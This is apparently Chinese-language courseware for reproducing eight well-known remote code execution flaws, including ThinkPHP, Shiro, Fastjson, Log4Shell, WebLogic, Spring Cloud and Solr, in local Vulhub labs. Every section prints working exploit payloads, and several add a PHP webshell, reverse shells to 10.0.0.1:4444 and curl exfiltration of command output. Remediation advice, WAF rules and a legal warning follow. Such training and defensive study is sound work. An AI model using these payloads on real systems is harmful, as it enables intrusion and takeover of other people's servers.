# Vulhub 高频漏洞实战 · S 级（企业 SRC / 护网必考）
## 总览
| #   | 漏洞                            | CVE                           | 类型      |
| --- | ----------------------------- | ----------------------------- | ------- |
| 1   | ThinkPHP 5.0.23 / 5.1.x RCE   | CNVD-2018-24942               | 框架 RCE  |
| 2   | Apache Shiro 1.2.4 反序列化       | CVE-2016-4437                 | 反序列化    |
| 3   | Fastjson 1.2.24 / 1.2.47 JNDI | CVE-2017-18349 / 无CVE         | 反序列化    |
| 4   | Log4j2 log4shell              | CVE-2021-44228                | JNDI 注入 |
| 5   | WebLogic T3 / wls9-async      | CVE-2018-2628 / CVE-2019-2725 | 反序列化    |
| 6   | Spring Cloud Function SpEL    | CVE-2022-22963                | 表达式注入   |
| 7   | Spring Cloud Gateway          | CVE-2022-22947                | 表达式注入   |
| 8   | Apache Solr Velocity          | CVE-2019-17558                | SSTI    |


---

## 公共准备
### 安装 Vulhub
```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub
# 进入对应目录后
docker-compose up -d
```

### 常用工具
```bash
# Java 反序列化
git clone https://github.com/yso-jackson/ysoerial.git
git clone https://github.com/feihong-cs/ShiroExploit-Deprecated.git
git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
git clone https://github.com/bkth/ysoserial-modified.git

# 通用
Burp Suite / nc / curl / dig / nslookup
```

---

# 第 1 关 ThinkPHP 5.0.23 / 5.1.x RCE
## 1.1 产品介绍
**ThinkPHP** 是国内最流行的 PHP 开发框架之一，由上海顶想公司维护。从 2006 年发布至今，被大量企业官网、CMS、电商、OA 系统使用。

+ 官网：[https://thinkphp.cn](https://thinkphp.cn)
+ 特点：MVC、低门槛、文档完善
+ 国内政府、学校、企业官网大量基于 ThinkPHP 5.x / 6.x

## 1.2 漏洞背景
2018 年 12 月 9 日，ThinkPHP 官方发布安全更新，修复了一处**框架层 RCE 漏洞**，编号 CNVD-2018-24942。

漏洞根因：
+ 框架对 URL 路由参数解析不严
+ 用户可控的 `s` 参数被传入 `Controller::invokeMethod()`，导致可以调用任意类的任意方法
+ 配合 PHP 字符串解析特性，可拼接调用 `Request` 类的 `input` 方法 → 触发 `call_user_func` → 任意命令执行

该漏洞被称为"ThinkPHP 5.x 系列核弹"，至今在野利用依然频繁。

## 1.3 利用条件与版本
| 版本 | 漏洞 | 利用 Payload 差异 |
| --- | --- | --- |
| 5.0.0 - 5.0.23 | RCE | 路由 1 |
| 5.1.0 - 5.1.30 | RCE | 路由 2 |

**利用条件**：
+ 默认配置即可触发
+ 无需任何认证
+ 只需要 Web 端口可达

## 1.4 复现过程
### 1.4.1 启动环境
```bash
cd vulhub/thinkphp/5.0.23-rce
docker-compose up -d
# 默认端口 80
curl http://localhost:8080/
```

### 1.4.2 漏洞检测
**5.0.x Payload**：
```bash
curl "http://localhost:8080/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
```

返回 `phpinfo()` 页面 → 漏洞存在。

### 1.4.3 命令执行
```bash
curl "http://localhost:8080/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
```

返回类似 `uid=33(www-data) gid=33(www-data)`。

### 1.4.4 写入 webshell
```bash
curl "http://localhost:8080/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php%20@eval(\$_POST[cmd]);?>"
```

访问 `http://localhost:8080/shell.php` POST 数据 `cmd=phpinfo();` 验证。

### 1.4.5 5.1.x Payload
```bash
curl "http://target/public/index.php?s=index/\think\Request/input&filter[]=system&data=id"
curl "http://target/public/index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php%20phpinfo();?>"
```

### 1.4.6 5.0.23 路由 2（兼容写法）
```bash
curl "http://target/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
```

## 1.5 修复建议
1. **升级到 5.0.24 / 5.1.31 及以上**
2. 临时缓解：在 `application/route.php` 中强制路由
3. WAF 规则：拦截 `s=` 参数中的反斜杠和 `think\app`、`invokefunction` 等关键字
4. 关闭 `app_trace`、`app_debug`，避免泄露框架信息
5. Nginx 配置强制路由（`try_files`）替代 `?s=` 解析

---

# 第 2 关 Apache Shiro 1.2.4 反序列化（CVE-2016-4437）
## 2.1 产品介绍
**Apache Shiro** 是 Java 生态流行的权限/认证框架，提供：
+ 认证（Authentication）
+ 授权（Authorization）
+ 加密（Cryptography）
+ 会话管理（Session Management）

常见搭配 Spring / Spring Boot，国内外大量企业使用，特别是 OA、ERP、CRM 系统。

## 2.2 漏洞背景
2016 年安全研究员 Jasmin Blanchette 披露：
+ Shiro 默认使用 Cookie 字段 `rememberMe` 记住用户登录状态
+ 流程：用户对象 → 序列化 → **AES-CBC 加密** → Base64 → Cookie
+ **致命点**：默认 AES 密钥硬编码在源码里：`kPH+bIxk5D2deZiIxcaaaA==`
+ 攻击者：构造恶意序列化对象 → 用默认 key 加密 → 塞进 Cookie → 服务端反序列化 → 执行任意代码

漏洞编号 CVE-2016-4437，业内俗称 "Shiro550"（参考其内部 issue 编号）。

## 2.3 利用条件与版本
| 版本 | 漏洞 |
| --- | --- |
| Shiro ≤ 1.2.4 | 默认 key 漏洞 |
| Shiro 1.2.5 - 1.4.1 | 默认 key 已改，但用户可能改回旧 key |
| Shiro ≥ 1.4.2 | 改用 AES-GCM，密钥每次启动随机 |

**利用条件**：
+ 应用使用 `rememberMe` 功能
+ AES key 是默认值或可爆破出来
+ 服务端 classpath 中存在可用 gadget（CommonsCollections / CommonsBeanutils 等）

## 2.4 复现过程
### 2.4.1 启动环境
```bash
cd vulhub/shiro/CVE-2016-4437
docker-compose up -d
# 账户 admin / vulhub
```

### 2.4.2 指纹识别
登录请求响应头会包含：
```plain
Set-Cookie: rememberMe=deleteMe; Path=/jenkins
```

或在 Cookie 中带 `rememberMe` 字段。

### 2.4.3 准备利用工具
```bash
git clone https://github.com/feihong-cs/ShiroExploit-Deprecated
cd ShiroExploit-Deprecated
# 这是一个 GUI 工具
java -jar ShiroExploit.jar
```

或使用命令行工具：
```bash
git clone https://github.com/feihong-cs/shiro-550-without-urldns.git
```

### 2.4.4 利用步骤
1. **爆破 AES key**（默认 `kPH+bIxk5D2deZiIxcaaaA==`）
2. **检测可用 gadget**：用 URLDNS 探测 classpath
3. **生成 payload**：
```bash
# 用 ysoserial 生成 CommonsBeanutils1 链
java -jar ysoserial.jar CommonsBeanutils1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" > payload.bin
```

4. **用 Shiro key 加密 payload**：
```python
# shiro_encrypt.py
import base64, uuid
from Crypto.Cipher import AES
import subprocess

key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
iv = uuid.uuid4().bytes
cipher = AES.new(key, AES.MODE_CBC, iv)
with open('payload.bin', 'rb') as f:
    payload = f.read()
# PKCS5 padding
pad = 16 - len(payload) % 16
payload += bytes([pad]) * pad
ct = iv + cipher.encrypt(payload)
print(base64.b64encode(ct).decode())
```

5. **发送请求**：
```bash
curl -H "Cookie: rememberMe=$(python shiro_encrypt.py)" http://target/
```

6. **接收反弹 shell**（攻击者监听）：
```bash
nc -lvnp 4444
```

### 2.4.5 一把梭 GUI 工具
打开 ShiroExploit.jar：

+ 输入 URL
+ 选择 `Shiro-550（key+gadget）`
+ 选择 `Use URLDNS to detect gadget chain`
+ 选择执行模式（命令执行 / 内存马 / 反弹 shell）
+ 一键利用

## 2.5 修复建议
1. **升级 Shiro 到 ≥ 1.4.2**，AES key 每次启动随机生成
2. 临时缓解：
    - 修改默认 key 为高熵随机值
    - 升级配套依赖（避免 CommonsCollections 老版本）
3. WAF 规则：拦截异常长的 `rememberMe` Cookie（>1KB）
4. 关闭不必要的 rememberMe 功能

---

# 第 3 关 Fastjson 1.2.24 / 1.2.47 JNDI 注入
## 3.1 产品介绍
**Fastjson** 是阿里巴巴开源的 JSON 解析库，性能极高，被国内 Java 项目广泛使用。
+ GitHub：[https://github.com/alibaba/fastjson](https://github.com/alibaba/fastjson)
+ 提供序列化 / 反序列化、JSON Path、流式解析

## 3.2 漏洞背景
Fastjson 的 `@type` 字段允许指定反序列化的目标类，框架会调用 setter 方法。安全研究员发现：
+ **1.2.24 之前**：完全没限制，任意类反序列化
+ 经典 gadget：`com.sun.rowset.JdbcRowSetImpl` 的 `setDataSourceName` + `setAutoCommit` → 触发 JNDI lookup → 加载远程恶意类 → RCE
+ **1.2.47 是绕过版**：通过缓存机制 `mapping` 绕过 1.2.25-1.2.46 的黑名单

## 3.3 利用条件与版本
| 版本 | 漏洞 | 备注 |
| --- | --- | --- |
| ≤ 1.2.24 | 直接触发 | `parseObject` 接受 `@type` |
| 1.2.25 - 1.2.46 | 黑名单 | 大部分 gadget 被拦 |
| ≤ 1.2.47 | 缓存绕过 | 默认配置即可 |
| 1.2.68+ | safeMode | 默认安全 |
| 1.2.83+ | safeMode 默认开启 | 强烈建议升级 |

**利用条件**：
+ 服务端用 fastjson 解析用户可控的 JSON
+ Java 版本 < 8u191（JNDI 远程加载）或使用本地 gadget（TemplatesImpl）

## 3.4 复现过程
### 3.4.1 启动环境
```bash
cd vulhub/fastjson/1.2.47-rce
docker-compose up -d
```

访问 `http://localhost:8090/` 看到 JSON 提交表单。

### 3.4.2 准备 RMI/LDAP 服务
```bash
git clone https://github.com/welk1n/JNDI-Injection-Exploit
cd JNDI-Injection-Exploit
mvn clean package -DskipTests

java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-jar-with-dependencies.jar \
  -C "bash -c {echo,...base64...}|{base64,-d}|{bash,-i}" \
  -A <攻击机IP>
```

输出几个可用的 JNDI URL，例如：
```plain
rmi://10.0.0.1:1099/abc123
ldap://10.0.0.1:1389/abc123
```

### 3.4.3 1.2.24 Payload
```http
POST / HTTP/1.1
Content-Type: application/json

{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://10.0.0.1:1389/abc123",
  "autoCommit":true
}
```

服务端反序列化时：
+ `setDataSourceName("ldap://...")` 设置 JNDI URL
+ `setAutoCommit(true)` 触发 `connect()` → JNDI lookup
+ 攻击者 RMI/LDAP 服务返回恶意 Java 类 → 加载执行

### 3.4.4 1.2.47 绕过 Payload
```http
POST / HTTP/1.1
Content-Type: application/json

{
  "a": {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
  "b": {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://10.0.0.1:1389/abc123","autoCommit":true}
}
```

**原理**：
+ `java.lang.Class` 不在黑名单
+ 第一次解析把 `JdbcRowSetImpl` 加入全局缓存 `mapping`
+ 第二次直接使用缓存中的类，绕过黑名单检查

### 3.4.5 TemplatesImpl 本地链（无需 JNDI 出网）
适合目标不出网场景：

```json
{
  "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes":["<Base64编码的恶意类class>"],
  "_name":"a.b",
  "_tfactory":{},
  "_outputProperties":{}
}
```

恶意类继承 `AbstractTranslet`，在静态块里执行命令。

## 3.5 修复建议
1. **升级到 1.2.83 以上**，开启 `safeMode`
2. 配置 `ParserConfig.getGlobalInstance().setSafeMode(true)`
3. 升级 JDK 到 8u191+（JNDI 远程类加载默认禁用）
4. WAF 规则：拦截 `@type` 关键字
5. 替换为 fastjson v2 / jackson / gson

---

# 第 4 关 Apache Log4j2 log4shell（CVE-2021-44228）
## 4.1 产品介绍
**Apache Log4j2** 是 Java 生态最流行的日志组件，几乎每个 Java 项目都用它记录日志。
log4j2:log for(four 谐音) java 2(第二代)
+ 提供分级日志（DEBUG / INFO / WARN / ERROR）
+ 支持格式化、过滤器、输出到文件/网络/数据库
+ 被 Spring / Hadoop / ElasticSearch / Solr / Struts 等无数项目依赖

## 4.2 漏洞背景
2021 年 11 月 24 日，阿里云安全团队向 Apache 报告；12 月 9 日公开。
漏洞原理：
+ Log4j2 支持 **Lookup** 语法：`${...}`
+ 包括 `${env:NAME}`（环境变量）、`${sys:property}`（系统属性）、`${jndi:...}`（JNDI 查询）
+ 日志内容被直接 Lookup 解析
+ **致命点**：`${jndi:ldap://attacker/x}` 会发起 LDAP 请求 → 远程加载 Java 类 → 执行静态块

由于日志记录是几乎所有应用都做的事，**任何会被记入日志的用户可控数据**（User-Agent、登录名、聊天内容、命令参数）都是攻击面。

被业内称为"互联网核弹"，影响全球数十亿设备。

## 4.3 利用条件与版本
| 版本 | 漏洞 |
| --- | --- |
| 2.0-beta9 - 2.14.1 | 完全可利用 |
| 2.15.0 | 部分（仍有 CVE-2021-45046） |
| 2.16.0 | 仍有 CVE-2021-45105（DoS） |
| 2.17.1+ | 安全 |
**利用条件**：
+ 应用使用受影响 Log4j2 版本
+ 用户输入被记入日志
+ 出网（或使用本地 gadget + DNS 协议）
## 4.4 复现过程
### 4.4.1 启动环境
```bash
cd vulhub/log4j/CVE-2021-44228
docker-compose up -d
# 端口 8983
```

### 4.4.2 准备 LDAP 服务
```bash
git clone https://github.com/welk1n/JNDI-Injection-Exploit
cd JNDI-Injection-Exploit && mvn package -DskipTests

java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-jar-with-dependencies.jar \
  -C "touch /tmp/pwned" \
  -A <攻击机IP>
```

### 4.4.3 DNSLog 探测（先验证）
```bash
# 用 dnslog.cn 或 ceye.io 拿一个域名
# 提交 payload 到目标任意会被记录的字段：
curl "http://target:8983/solr/admin/cores" -H "X-Api-Version: \${jndi:ldap://xxx.dnslog.cn/a}"
```

DNSLog 平台收到解析记录 → 漏洞存在。

### 4.4.4 实际利用
```bash
curl "http://target:8983/" -H "User-Agent: \${jndi:ldap://10.0.0.1:1389/abc123}"
```

或更通用的：
```bash
curl "http://target:8983/solr/admin/cores?action=\${jndi:ldap://10.0.0.1:1389/abc123}"
```

服务端 Log4j2 解析 → LDAP 查询 → 加载攻击者提供的恶意类 → 执行 `touch /tmp/pwned`。

### 4.4.5 验证
```bash
docker-compose exec log4j2 ls /tmp/
# 看到 pwned 文件
```

### 4.4.6 反弹 Shell
把命令换成 base64 编码的反弹 shell：

```bash
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=

# JNDI-Injection-Exploit 用 -C "bash -c {echo,...}|{base64,-d}|{bash,-i}"
```

### 4.4.7 payload 位置汇总
**所有会被记录的字段都试一遍**：
```plain
User-Agent
Referer
X-Forwarded-For
X-Api-Version
Authorization
登录用户名
搜索关键词
聊天内容
URL 路径
表单任意字段
```

## 4.5 修复建议
1. **升级 Log4j2 到 2.17.1+**
2. 临时缓解（不重启）：
    - 设置环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`
    - 修改 `log4j2.component.properties` 添加 `log4j2.formatMsgNoLookups=true`
    - 删除 `JndiLookup` 类：`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
3. WAF 规则：拦截 `${jndi:` `${env:` 等 lookup 关键字
4. 出网管控：服务器禁止主动外联 LDAP/RMI 端口
5. 升级 JDK 到 8u191+，禁用远程类加载

---

# 第 5 关 WebLogic T3 / wls9-async 反序列化
## 5.1 产品介绍
**Oracle WebLogic Server** 是企业级 Java EE 应用服务器，主要用于银行、保险、政府大型系统。
+ 提供 EJB、JMS、Web Service 容器
+ T3 协议是 WebLogic 私有协议，用于客户端与服务端通信
+ 默认端口 7001（Web）、IIOP（7002）

## 5.2 漏洞背景
WebLogic 反序列化漏洞**系列**（CVE 众多），最经典两个：
+ **CVE-2018-2628**：T3 协议反序列化。攻击者发送特制 T3 请求，触发 `readObject`，配合 ysoserial gadget RCE。
+ **CVE-2019-2725**：`wls9-async` 组件反序列化。通过 `/_async/AsyncResponseService` 接口，无需 T3 协议，POST SOAP 报文即可。
+ 后续 CVE-2020-2551（IIOP）、CVE-2020-14882（控制台）等持续披露
由于 WebLogic 部署在金融/政企核心系统，每次 CVE 都是行业震动。

## 5.3 利用条件与版本
| CVE | 影响版本 | 协议 |
| --- | --- | --- |
| CVE-2018-2628 | 10.3.6 / 12.1.3 / 12.2.1.2 / 12.2.1.3 | T3 |
| CVE-2019-2725 | 10.3.6 / 12.1.3 | HTTP POST |
| CVE-2020-2551 | 10.3.6 / 12.1.3 / 12.2.1.x | IIOP |


**利用条件**：
+ 目标暴露 T3 端口（7001、7002）或 HTTP 接口
+ 无认证
+ classpath 中有可用 gadget

## 5.4 复现过程
### 5.4.1 启动环境
```bash
cd vulhub/weblogic/CVE-2018-2628
docker-compose up -d
# 启动较慢（2-3 分钟），等日志出现 "Server state changed to RUNNING"
```

### 5.4.2 指纹识别
```bash
# 端口扫描
nmap -p 7001,7002 --script weblogic-t3-info target

# HTTP 访问
curl http://target:7001/console
# 看到 "WebLogic Server Administration Console"
```

### 5.4.3 CVE-2018-2628 利用（Python 脚本）
```bash
git clone https://github.com/0nise/CVE-2018-2628
python CVE-2018-2628.py target 7001 ysoserial-CC.jar "bash -c {echo,...}|{base64,-d}|{bash,-i}"
```

或者用现成工具 WeblogicScanner：

```bash
git clone https://github.com/0xn0ne/weblogicScanner
python ws.py -t http://target:7001
```

### 5.4.4 CVE-2019-2725 利用（POST SOAP）
```bash
curl -X POST http://target:7001/_async/AsyncResponseService \
  -H "Content-Type: text/xml" \
  -d '
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.xmldecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>bash</string></void>

            <void index="1"><string>-c</string></void>

            <void index="2"><string>touch /tmp/pwned</string></void>

          </array>

          <void method="start"/>
        </void>

      </java>

    </work:WorkContext>

  </soapenv:Header>

  <soapenv:Body/>
</soapenv:Envelope>'
```

### 5.4.5 验证
```bash
docker-compose exec weblogic ls /tmp/
```

## 5.5 修复建议
1. **打补丁**（Oracle CPU 季度更新）
2. 临时缓解：
    - T3 协议白名单（限制可连接 IP）
    - 删除 `_async` 应用：`rm -rf wlserver_10.3/server/lib/_async.ear`
3. 网络隔离：WebLogic 不对公网暴露
4. WAF 规则：拦截 `/_async/AsyncResponseService`、`/wls-wsat/CoordinatorPortType`
5. 升级到 14.1.1.0+

---

# 第 6 关 Spring Cloud Function SpEL（CVE-2022-22963）
## 6.1 产品介绍
**Spring Cloud Function** 是 Spring 生态的"函数即服务"框架，让开发者用函数式编程写微服务，自动适配 AWS Lambda / Azure Functions 等云平台。

## 6.2 漏洞背景
2022 年 3 月披露。漏洞根因：

+ 框架通过 HTTP header `spring.cloud.function.routing-expression` 决定路由到哪个 function
+ 该 header 内容被 **SpEL 表达式引擎**解析
+ SpEL（Spring Expression Language）可调用任意 Java 方法

```java
// 源码漏洞点
Expression expression = FUNCTION_PARSER.parseExpression(routingExpression);
return expression.getValue(context, ...);
```

## 6.3 利用条件与版本
| 版本 | 漏洞 |
| --- | --- |
| 3.1.6 以下 | 可利用 |
| 3.2.2 以下 | 可利用 |
| 3.1.6+ / 3.2.2+ | 已修复 |


**利用条件**：

+ 使用 Spring Cloud Function 暴露 HTTP 接口
+ 默认配置无需认证

## 6.4 复现过程
### 6.4.1 启动环境
```bash
cd vulhub/spring/CVE-2022-22963
docker-compose up -d
# 端口 8080
```

### 6.4.2 漏洞检测
```bash
curl -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')" \
     http://localhost:8080/uppercase -d "test"
```

服务端日志出现 `id` 命令执行 → 漏洞存在。

### 6.4.3 回显利用
由于 `exec()` 不回显，用 `ProcessBuilder` + 读取流：
```bash
curl -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","curl http://10.0.0.1:8080/$(id|base64)"})' \
     http://target:8080/uppercase -d "test"
```

DNSLog 版：
```bash
curl -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","ping -c 1 `id`.dnslog.cn"})' \
     http://target:8080/uppercase -d "test"
```

### 6.4.4 反弹 Shell
```bash
curl -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{\"bash\",\"-c\",\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"})" \
     http://target:8080/uppercase -d "test"
```

## 6.5 修复建议
1. **升级到 3.1.6 / 3.2.2 以上**
2. 临时缓解：删除 `spring-cloud-function-context` 中的 `RoutingFunction`，或关闭 function routing
3. WAF 规则：拦截 `spring.cloud.function.routing-expression` header
4. 限制应用入口，不暴露内部端口

---

# 第 7 关 Spring Cloud Gateway（CVE-2022-22947）
## 7.1 产品介绍
**Spring Cloud Gateway** 是 Spring 官方推出的微服务 API 网关，提供：

+ 路由转发
+ 鉴权
+ 限流
+ 监控

是 Spring Cloud 微服务架构的"门面"，使用极广。

## 7.2 漏洞背景
2022 年 3 月 1 日披露。漏洞根因：

+ Gateway 通过 Actuator 端点 `/actuator/gateway/routes/{id}` 暴露路由管理 API
+ 路由配置中可以写 **SpEL 表达式 filter**
+ 攻击者通过 POST 添加恶意路由 → 触发 SpEL 求值 → RCE

```plain
POST /actuator/gateway/routes/pwn
{
  "id": "pwn",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"
    }
  }],
  ...
}
```

## 7.3 利用条件与版本
| 版本 | 漏洞 |
| --- | --- |
| 3.1.0 以下 | 可利用 |
| 3.0.6 以下 | 可利用 |
| 3.1.1+ / 3.0.7+ | 已修复 |


**利用条件**：暴露了 Actuator 端点（默认关闭，但运维常开）

## 7.4 复现过程
### 7.4.1 启动环境
```bash
cd vulhub/spring/CVE-2022-22947
docker-compose up -d
```

### 7.4.2 探测 Actuator
```bash
curl http://target:8080/actuator
# 返回端点列表，包含 /actuator/gateway/routes
```

### 7.4.3 注入恶意路由
```bash
curl -X POST http://target:8080/actuator/gateway/routes/pwn \
  -H "Content-Type: application/json" \
  -d '{
    "id": "pwn",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"id\"}).getInputStream().readAllBytes())}"
      }
    }],
    "uri": "http://example.com"
  }'
```

### 7.4.4 刷新路由
```bash
curl -X POST http://target:8080/actuator/gateway/refresh
```

### 7.4.5 触发并查看结果
```bash
curl http://target:8080/pwn
# 响应头中会有 Result: uid=0(root)...
```

### 7.4.6 清理痕迹
```bash
curl -X DELETE http://target:8080/actuator/gateway/routes/pwn
curl -X POST http://target:8080/actuator/gateway/refresh
```

## 7.5 修复建议
1. **升级到 3.1.1+ / 3.0.7+**
2. 临时缓解：禁用 Actuator 端点（`management.endpoint.gateway.enabled=false`）或网络隔离
3. 永远不要把 Actuator 暴露到公网
4. WAF 规则：拦截 `/actuator/gateway/routes` 的 POST 请求

---

# 第 8 关 Apache Solr Velocity SSTI（CVE-2019-17558）
## 8.1 产品介绍
**Apache Solr** 是 Apache 基金会的开源企业搜索平台，基于 Lucene 构建。

+ 提供全文搜索、命中高亮、 faceted search
+ 常用于电商商品搜索、日志分析、企业知识库
+ 默认端口 8983

## 8.2 漏洞背景
2019 年 10 月披露。漏洞根因：

+ Solr 自带 ResponseWriter 模块，支持多种输出格式（JSON/XML/Velocity）
+ Velocity 模板渲染时未对模板内容做沙箱限制
+ 攻击者通过 `wt=velocity` + `v.template=...` 参数注入 Velocity 模板 → SSTI → RCE

后续还有 CVE-2021-27905（SSRF）、CVE-2021-29262 等。

## 8.3 利用条件与版本
| 版本 | 漏洞 |
| --- | --- |
| 8.2.0 以下 | 可利用 |
| 8.3.0+ | 已修复 |


**利用条件**：

+ Solr 暴露 HTTP（默认无认证）
+ 知道一个 core 名（可通过 `/solr/admin/cores` 获取）

## 8.4 复现过程
### 8.4.1 启动环境
```bash
cd vulhub/solr/CVE-2019-17558
docker-compose up -d
```

### 8.4.2 获取 core 名
```bash
curl "http://localhost:8983/solr/admin/cores?wt=json"
# 返回 {"status":{"my_core":{...}}}
# my_core 就是 core 名
```

### 8.4.3 触发 SSTI
```bash
curl "http://localhost:8983/solr/my_core/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set(%24x%3D%27%27)%23set(%24rt%3D%24x.class.forName(%27java.lang.Runtime%27))%23set(%24chr%3D%24x.class.forName(%27java.lang.Character%27))%23set(%24str%3D%24x.class.forName(%27java.lang.String%27))%23set(%24ex%3D%24rt.getRuntime().exec(%27id%27))%24ex.waitFor()%24str.valueOf(%24chr.toChars(%24ex.getInputStream().read()))"
```

URL 解码后：

```plain
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
$str.valueOf($chr.toChars($ex.getInputStream().read()))
```

返回执行结果。

### 8.4.4 反弹 Shell
把 exec 内容换成：

```plain
['bash','-c','bash -i >& /dev/tcp/10.0.0.1/4444 0>&1']
```

注意 Velocity 数组语法：

```plain
#set($ex=$rt.getRuntime().exec(new string[]{"bash","-c","..."}))
```

## 8.5 修复建议
1. **升级到 8.3.0+**
2. 临时缓解：
    - 修改 `solrconfig.xml`，禁用 VelocityResponseWriter
    - 设置 Solr 鉴权（`bin/solr auth enable`）
3. 网络隔离：Solr 仅内网访问，不暴露公网
4. WAF 规则：拦截 `wt=velocity` 参数

---

## 追加一个Nacos
## 总结表
| 漏洞 | 出现频率 | 利用难度 | 危害 | 关联课件 |
| --- | --- | --- | --- | --- |
| ThinkPHP 5.x RCE | ★★★★★ | 易 | RCE | 命令注入 |
| Shiro 1.2.4 | ★★★★★ | 中 | RCE | 反序列化 |
| Fastjson | ★★★★★ | 中 | RCE | 反序列化 |
| Log4j2 | ★★★★★ | 易 | RCE | 反序列化 |
| WebLogic | ★★★★ | 中 | RCE | 反序列化 |
| Spring Cloud Function | ★★★ | 易 | RCE | SSTI |
| Spring Cloud Gateway | ★★★ | 中 | RCE | SSTI |
| Apache Solr | ★★★ | 中 | RCE | SSTI |


## 课后作业
1. 按本课件顺序，依次复现 8 个漏洞，每个漏洞提交：
    - 复现步骤截图
    - payload 与回显
    - 修复方案验证
2. 把 8 个漏洞的指纹（响应头、URL 路径、报错特征）整理成 Nmap / Nuclei 模板。
3. 阅读 ysoserial、ShiroExploit 的源码，理解 gadget 选择逻辑。
4. 在 HackTheBox / VulnHub 找一台含上述漏洞的综合靶机通关。
5. 编写一份《企业内 Java 中间件应急响应 checklist》。

## 法律与授权提醒
```plain
┌──────────────────────────────────────────────────────────┐
│ 1. 所有复现必须在本地 Vulhub 环境或授权环境              │
│ 2. 禁止对生产系统、政府、金融网站测试                    │
│ 3. 这些漏洞一旦利用即 RCE，可能构成                      │
│    - 《刑法》285 条非法侵入计算机信息系统罪              │
│    - 《刑法》286 条破坏计算机信息系统罪                  │
│ 4. 互联网上仍有大量未修复目标，访问即违法                │
│ 5. SRC 测试超出范围会取消奖金并追究法律责任              │
└──────────────────────────────────────────────────────────┘
```

---

## 下一课件预告
下一章 **《Vulhub 高频漏洞 A 级实战》**，包括 9 个漏洞：Struts2 / Tomcat Ghostcat / Apache 解析 / Nginx 解析 / Jenkins / Confluence / Drupal / GitLab / phpunit。
